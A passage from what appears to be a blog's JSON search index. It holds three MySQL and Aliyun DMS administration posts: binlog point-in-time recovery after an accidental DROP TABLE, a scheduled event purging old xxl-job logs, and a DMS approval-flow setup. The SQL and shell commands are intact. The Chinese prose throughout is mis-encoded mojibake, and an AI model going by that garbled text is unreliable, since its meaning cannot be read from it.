class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog --start-datetime\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;2025-01-02 14:40:00\u0026#34;\u003c/span\u003e --stop-datetime\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;2025-01-02 14:50:00\u0026#34;\u003c/span\u003e --verbose binlog.000009 \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -i -C15 \u003cspan class=\"s2\"\u003e\u0026#34;drop table\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003emore\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog binlog.000009 --stop-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e260734003\u003c/span\u003e --database\u003cspan class=\"o\"\u003e=\u003c/span\u003ework_oa \u0026gt; 9.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæ³¨æ„ï¼Œåˆ†æï¼šçœ‹åˆ° at \u003cspan class=\"m\"\u003e260734003\u003c/span\u003e ä¸‹é¢æœ‰ä¸ª drop table ï¼Œè¯´æ˜æ˜¯åœ¨ \u003cspan class=\"m\"\u003e260734003\u003c/span\u003e ä¹‹åå‘ç”Ÿäº† drop table æ“ä½œ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæ‰€ä»¥ï¼Œå›æ”¾åˆ°260734003å°±å¯ä»¥äº†ã€‚ä¹‹åã€ä¹‹åã€ä¹‹åæ‰æ“ä½œçš„ï¼ï¼ï¼\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.original_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.immediate_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@SESSION.GTID_NEXT\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ANONYMOUS\u0026#39;\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734003\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:06:20 server id 1  end_log_pos 355 CRC32 0x2fc1e5ea \tQuery\tthread_id=16\texec_time=0\terror_code=0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET \u003cspan class=\"nv\"\u003eTIMESTAMP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971580/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.pseudo_thread_id\u003cspan class=\"o\"\u003e=\u003c/span\u003e16/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.foreign_key_checks\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.sql_auto_is_null\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, @@session.unique_checks\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.autocommit\u003cspan class=\"o\"\u003e=\u003c/span\u003e1/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.sql_mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e1168113696/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.auto_increment_increment\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.auto_increment_offset\u003cspan class=\"o\"\u003e=\u003c/span\u003e1/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!\u003cspan class=\"se\"\u003e\\C\u003c/span\u003e utf8mb4 *//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.character_set_client\u003cspan class=\"o\"\u003e=\u003c/span\u003e255,@@session.collation_connection\u003cspan class=\"o\"\u003e=\u003c/span\u003e255,@@session.collation_server\u003cspan class=\"o\"\u003e=\u003c/span\u003e255/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.lc_time_names\u003cspan class=\"o\"\u003e=\u003c/span\u003e0/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.collation_database\u003cspan class=\"o\"\u003e=\u003c/span\u003eDEFAULT/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80011 SET @@session.default_collation_for_utf8mb4\u003cspan class=\"o\"\u003e=\u003c/span\u003e255*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDROP TABLE \u003cspan class=\"sb\"\u003e`\u003c/span\u003epets\u003cspan class=\"sb\"\u003e`\u003c/span\u003e.\u003cspan class=\"sb\"\u003e`\u003c/span\u003ecats\u003cspan class=\"sb\"\u003e`\u003c/span\u003e /* generated by server */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734009\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:07:48 server id 1  end_log_pos 434 CRC32 0x123d65df \tAnonymous_GTID\tlast_committed=1\tsequence_number=2\trbr_only=no\toriginal_committed_timestamp=1583971668462467\timmediate_commit_timestamp=1583971668462467\ttransaction_length=473\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80001 SET @@session.original_commit_timestamp\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971668462467*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.original_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.immediate_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@SESSION.GTID_NEXT\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ANONYMOUS\u0026#39;\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734188\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:07:48 server id 1  end_log_pos 828 CRC32 0x57fac9ac \tQuery\tthread_id=16\texec_time=0\terror_code=0\tXid = 217\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euse \u003cspan class=\"sb\"\u003e`\u003c/span\u003epets\u003cspan class=\"sb\"\u003e`\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET \u003cspan class=\"nv\"\u003eTIMESTAMP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971668/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80013 SET @@session.sql_require_primary_key\u003cspan class=\"o\"\u003e=\u003c/span\u003e0*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCREATE TABLE dogs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬è¿˜æ˜¯å…ˆæ‰¾åˆ° binlog ä¸­  drop table ä¹‹ç±»çš„æ“ä½œå­—æ ·ï¼Œç„¶åç¡®å®š position åï¼ŒæŠŠ binlog.00009 ä¸­ä¹‹å‰çš„ log å¯¼å‡ºã€‚\u003c/p\u003e","title":"Mysqlçš„æŸä¸ªè¡¨æ¢å¤åˆ°æŸä¸€ä¸ªæ—¶é—´ç‚¹çš„æ“ä½œ"},{"content":"xxl-jobçš„æ—¥å¿—æ•°æ®å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå‹æ ¹å°±æ²¡æœ‰æ¸…ç†è¿‡ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¥å®šæ—¶åˆ é™¤æ— ç”¨çš„åºŸæ•°æ®å§ï¼š\né¦–å…ˆè¦ç¡®è®¤å®šæ—¶ä»»åŠ¡å¼€å…³å·²ç»æ‰“å¼€äº†\nshow variables like \u0026#39;event_scheduler\u0026#39;; Onè¡¨ç¤ºå¼€å¯ ç„¶ååˆ°æŒ‡å®šçš„åº“ä¸‹ï¼Œuse k8s_xxl_job\nCREATE EVENT delete_k8s_xxl_log ON SCHEDULE EVERY 1 DAY DO DELETE FROM xxl_job_log WHERE trigger_time \u0026lt; CURRENT_TIMESTAMP - INTERVAL 7 DAY; ä¿ç•™ä»Šå¤©çš„æ•°æ®ï¼Œä»¥åŠå‰7å¤©çš„è€æ•°æ®ã€‚ æŸ¥çœ‹ä»¥åŠç¼–è¾‘å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤ï¼š\n#æŸ¥çœ‹ show events; #æŸ¥çœ‹ç»†èŠ‚ SHOW CREATE EVENT delete_k8s_xxl_log #ç¼–è¾‘ ALTER EVENT delete_k8s_xxl_log ON SCHEDULE EVERY 1 DAY DO BEGIN -- åœ¨è¿™é‡Œæ·»åŠ ä½ æƒ³è¦æ‰§è¡Œçš„æ“ä½œ END; ","permalink":"https://rendoumi.com/posts/20240320-mysql_delete_xxllog/","summary":"\u003cp\u003exxl-jobçš„æ—¥å¿—æ•°æ®å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå‹æ ¹å°±æ²¡æœ‰æ¸…ç†è¿‡ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¥å®šæ—¶åˆ é™¤æ— ç”¨çš„åºŸæ•°æ®å§ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆè¦ç¡®è®¤å®šæ—¶ä»»åŠ¡å¼€å…³å·²ç»æ‰“å¼€äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow variables like \u003cspan class=\"s1\"\u003e\u0026#39;event_scheduler\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOnè¡¨ç¤ºå¼€å¯\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶ååˆ°æŒ‡å®šçš„åº“ä¸‹ï¼Œ\u003ccode\u003euse k8s_xxl_job\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCREATE EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eON SCHEDULE EVERY \u003cspan class=\"m\"\u003e1\u003c/span\u003e DAY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDELETE FROM xxl_job_log WHERE trigger_time \u0026lt; CURRENT_TIMESTAMP - INTERVAL \u003cspan class=\"m\"\u003e7\u003c/span\u003e DAY\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eä¿ç•™ä»Šå¤©çš„æ•°æ®ï¼Œä»¥åŠå‰7å¤©çš„è€æ•°æ®ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŸ¥çœ‹ä»¥åŠç¼–è¾‘å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æŸ¥çœ‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow events\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æŸ¥çœ‹ç»†èŠ‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSHOW CREATE EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ç¼–è¾‘\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALTER EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eON SCHEDULE EVERY \u003cspan class=\"m\"\u003e1\u003c/span\u003e DAY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBEGIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -- åœ¨è¿™é‡Œæ·»åŠ ä½ æƒ³è¦æ‰§è¡Œçš„æ“ä½œ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEND\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"è®¾ç½®Mysqlè‡ªåŠ¨å®šæ—¶åˆ é™¤xxljobçš„æ—¥å¿—æ•°æ®"},{"content":"å…¶å®æˆ‘ä»¬ç”¨çš„æ˜¯yearningæ¥ç®¡ç† MySQL æ•°æ®åº“å˜æ›´éœ€æ±‚çš„ï¼Œä½†æ˜¯ï¼Œç±»ä¼¼ Oracle æˆ–è€… PolarDBï¼Œå°±ç”¨ä¸æˆäº†ã€‚\nè¿™äº‹åªèƒ½äº¤ç»™é˜¿é‡Œäº‘çš„dmsæ¥ç®¡ç†äº†ï¼Œå…¶å®dmsè¦æ¯”yearningå¼ºå¤§å¾ˆå¤šï¼Œå¯ä»¥ç²¾ç¡®æ§åˆ¶åˆ°è¡¨çš„è¡Œçº§åˆ«æƒé™çš„ã€‚\nç†ç”±å°±æ˜¯dmsæ˜¯ä¸ªwebé¡µé¢ï¼Œä»£ç†è¿æ¥åˆ°åç«¯çš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä¸è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä»webç•Œé¢æ˜¯å®Œå…¨å¯ä»¥æ§åˆ¶çš„ã€‚å®é™…åˆ°æ•°æ®åº“çº§åˆ«åè€Œæœ‰çš„æ˜¯æ§åˆ¶ä¸ä½çš„ã€‚\nè¿™å°±æ¢³ç†ä¸€ä¸‹å»ºç«‹å®¡æ‰¹æµçš„æ­¥éª¤ï¼š\nä¸€ã€dmsåŒæ­¥ramç”¨æˆ· ramç”¨æˆ·æ˜¯ç®¡ç†çš„åŸºç¡€äº†ï¼Œè¿™äº›ç”¨æˆ·å¿…é¡»å…ˆè¡Œå¯¼å…¥dmsï¼Œæˆ‘ä»¬æ‰èƒ½è¿›ä¸€æ­¥èµ‹äºˆownerï¼ŒDBAçš„æƒé™\nç”¨æˆ·ç®¡ç†\u0026ndash;\u0026gt;åŒæ­¥å­è´¦å·ï¼Œé€‰æ‹©è¦dmsè¦ä½¿ç”¨çš„è´¦å·åŒæ­¥è¿‡æ¥å³å¯\näºŒã€è®¾å®šå®ä¾‹DBA DMSé‡Œçš„æƒé™æ˜¯è¿™æ ·çš„ï¼šåº“çš„è¯æœ‰Ownerï¼Œç„¶åå®ä¾‹çš„è¯æœ‰DBAï¼Œæœ€ä¸Šæ˜¯ç®¡ç†å‘˜ã€‚\né‚£ä¹ˆä¸€ä¸ªå®ä¾‹é‡Œæœ‰å‡ ä¸‡å¼ è¡¨ï¼Œæ²¡äººä¼šæƒ³ä¸€ä¸ªä¸€ä¸ªç‚¹å‡»èµ‹Ownerçš„æƒé™å§ã€‚\né‚£å°±ç²—åˆ†ä¸€ä¸‹ï¼Œä¸€ä¸ªäººå¯¹æ•´ä¸ªå®ä¾‹æœ‰æƒé™å®¡æ‰¹å³å¯ã€‚è¿™æ ·è¦å…ˆè®¾å®šæ•´ä¸ªå®ä¾‹çš„DBAè§’è‰²ã€‚\næˆ‘ä»¬å…ˆç¼–è¾‘ç”¨æˆ·ï¼Œè®©ä»–æœ‰DBAçš„è§’è‰²ï¼Œä»¥ä¾›ä¹‹ååœ¨å®ä¾‹çº§åˆ«å¯ä»¥é€‰æ‹©ä»–\nç„¶åå»å®ä¾‹ç®¡ç†é‡Œé¢ï¼š\né€‰æ‹©å®ä¾‹çš„å³è¾¹ï¼Œæ›´å¤š\u0026ndash;\u0026gt;ç¼–è¾‘å®ä¾‹\nå®ä¾‹çš„è´¦å·ã€å¯†ç ã€å®‰å…¨ååŒã€å®‰å…¨è§„åˆ™éƒ½é€‰ä¸Šï¼Œç„¶åé«˜çº§ä¿¡æ¯é‡Œï¼Œå®ä¾‹DBAå°±å¯ä»¥é€‰æ‹©åˆšæ‰è®¾ç½®äº†DBAè§’è‰²çš„äººäº†\nä¸‰ã€è®¾ç½®å®¡æ‰¹æµç¨‹ ç„¶åå»å®‰å…¨ä¸è§„èŒƒï¼Œå®¡æ‰¹æµç¨‹ï¼Œæ–°å¢å®¡æ‰¹æ¨¡æ¿ï¼Œæ¥è‡ªå®šä¹‰å®¡æ‰¹æµ\næˆ‘ä»¬å…¬å¸çš„å®¡æ‰¹æµä¸æ˜¯380ç¼ºçœé‚£ä¸ªï¼Œ380æ˜¯éœ€è¦ä¸‰ä¸ªäººå®¡æ‰¹çš„ï¼š\næˆ‘ä»¬çš„é“¾è·¯å°±å¾ˆå»ºå•äº†ï¼Œæœ‰æ“ä½œæƒé™çš„äººæ‰¾å®ä¾‹çš„DBAå®¡æ‰¹ï¼Œç„¶åè¿‡æœ€é«˜ç®¡ç†å‘˜æ‰¹å°±å®Œäº†ï¼Œæ‰€ä»¥åšå¦‚ä¸‹çš„æµç¨‹ï¼š\nå››ã€è®¾ç½®å®‰å…¨è§„åˆ™ æˆ‘ä»¬å†åˆ°å®‰å…¨ä¸è§„èŒƒï¼Œç‚¹å‡»å®‰å…¨è§„åˆ™ï¼Œæ‰¾åˆ°å…·ä½“å®ä¾‹é‡Œè®¾ç½®çš„ å¼ºç®¡æ§æ¨¡å¼ for MySQL\nå¯ä»¥çœ‹åˆ°å·²ç»æœ‰2ä¸ªå®ä¾‹ç”¨ä¸Šäº†ï¼Œç„¶ååˆ°å³è¾¹ï¼Œç‚¹å‡»ç¼–è¾‘ï¼š\næœ€ä¸»è¦çš„å°±æ˜¯SQLå˜æ›´ï¼Œæ•°æ®å˜æ›´é»˜è®¤å®¡æ‰¹æ¨¡æ¿çš„è®¾ç½®ï¼Œæˆ‘ä»¬æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å®¡æ‰¹æµå³å¯\nå…¶ä»–çš„é€‰é¡¹éƒ½å¯ä»¥æŒ‰éœ€è¿›è¡Œä¿®æ”¹ã€‚\näº”ã€è®¾ç½®ç”¨æˆ·æƒé™ å¦‚ä¸Šå®¡æ‰¹æµå°±å®Œæˆäº†ï¼Œæˆ‘ä»¬è¦ç™»å½•å…·ä½“çš„å®ä¾‹åˆ—è¡¨ï¼Œå†æ›´å¤šé‡Œè®¾ç½®æƒé™\næ³¨æ„ä¸Šé¢æ˜¯è®¾ç½®çš„å®ä¾‹çº§åˆ«çš„æƒé™ã€‚\nå¦‚æœè¦è®¾ç½®æ›´ç»†çº§åˆ«çš„åº“ã€è¡¨ã€è¡Œæƒé™ï¼Œéœ€è¦ç‚¹å‡»æ•°æ®åº“åˆ—è¡¨\nåœ¨è¿™é‡Œé¢çš„è¡¨è¯¦æƒ…çš„å³è¾¹æ›´å¤šï¼Œå¯ä»¥æ§åˆ¶åº“ã€è¡¨ã€è¡Œçš„æƒé™\nè¿™æ ·å°±å¯ä»¥å¼„å®Œæ•´ä¸ªæµç¨‹äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240305-aliyun_dms/","summary":"\u003cp\u003eå…¶å®æˆ‘ä»¬ç”¨çš„æ˜¯yearningæ¥ç®¡ç† MySQL æ•°æ®åº“å˜æ›´éœ€æ±‚çš„ï¼Œä½†æ˜¯ï¼Œç±»ä¼¼ Oracle æˆ–è€… PolarDBï¼Œå°±ç”¨ä¸æˆäº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™äº‹åªèƒ½äº¤ç»™é˜¿é‡Œäº‘çš„dmsæ¥ç®¡ç†äº†ï¼Œå…¶å®dmsè¦æ¯”yearningå¼ºå¤§å¾ˆå¤šï¼Œå¯ä»¥ç²¾ç¡®æ§åˆ¶åˆ°è¡¨çš„è¡Œçº§åˆ«æƒé™çš„ã€‚\u003c/p\u003e\n\u003cp\u003eç†ç”±å°±æ˜¯dmsæ˜¯ä¸ªwebé¡µé¢ï¼Œä»£ç†è¿æ¥åˆ°åç«¯çš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä¸è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä»webç•Œé¢æ˜¯å®Œå…¨å¯ä»¥æ§åˆ¶çš„ã€‚å®é™…åˆ°æ•°æ®åº“çº§åˆ«åè€Œæœ‰çš„æ˜¯æ§åˆ¶ä¸ä½çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™å°±æ¢³ç†ä¸€ä¸‹å»ºç«‹å®¡æ‰¹æµçš„æ­¥éª¤ï¼š\u003c/p\u003e\n\u003ch4 id=\"ä¸€dmsåŒæ­¥ramç”¨æˆ·\"\u003eä¸€ã€dmsåŒæ­¥ramç”¨æˆ·\u003c/h4\u003e\n\u003cp\u003eramç”¨æˆ·æ˜¯ç®¡ç†çš„åŸºç¡€äº†ï¼Œè¿™äº›ç”¨æˆ·å¿…é¡»å…ˆè¡Œå¯¼å…¥dmsï¼Œæˆ‘ä»¬æ‰èƒ½è¿›ä¸€æ­¥èµ‹äºˆownerï¼ŒDBAçš„æƒé™\u003c/p\u003e\n\u003cp\u003eç”¨æˆ·ç®¡ç†\u0026ndash;\u0026gt;åŒæ­¥å­è´¦å·ï¼Œé€‰æ‹©è¦dmsè¦ä½¿ç”¨çš„è´¦å·åŒæ­¥è¿‡æ¥å³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305163935106\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305163935106.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"äºŒè®¾å®šå®ä¾‹dba\"\u003eäºŒã€è®¾å®šå®ä¾‹DBA\u003c/h4\u003e\n\u003cp\u003eDMSé‡Œçš„æƒé™æ˜¯è¿™æ ·çš„ï¼šåº“çš„è¯æœ‰Ownerï¼Œç„¶åå®ä¾‹çš„è¯æœ‰DBAï¼Œæœ€ä¸Šæ˜¯ç®¡ç†å‘˜ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆä¸€ä¸ªå®ä¾‹é‡Œæœ‰å‡ ä¸‡å¼ è¡¨ï¼Œæ²¡äººä¼šæƒ³ä¸€ä¸ªä¸€ä¸ªç‚¹å‡»èµ‹Ownerçš„æƒé™å§ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±ç²—åˆ†ä¸€ä¸‹ï¼Œä¸€ä¸ªäººå¯¹æ•´ä¸ªå®ä¾‹æœ‰æƒé™å®¡æ‰¹å³å¯ã€‚è¿™æ ·è¦å…ˆè®¾å®šæ•´ä¸ªå®ä¾‹çš„DBAè§’è‰²ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å…ˆç¼–è¾‘ç”¨æˆ·ï¼Œè®©ä»–æœ‰DBAçš„è§’è‰²ï¼Œä»¥ä¾›ä¹‹ååœ¨å®ä¾‹çº§åˆ«å¯ä»¥é€‰æ‹©ä»–\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164233341\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164233341.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå»å®ä¾‹ç®¡ç†é‡Œé¢ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164150203\" loading=\"lazy\" 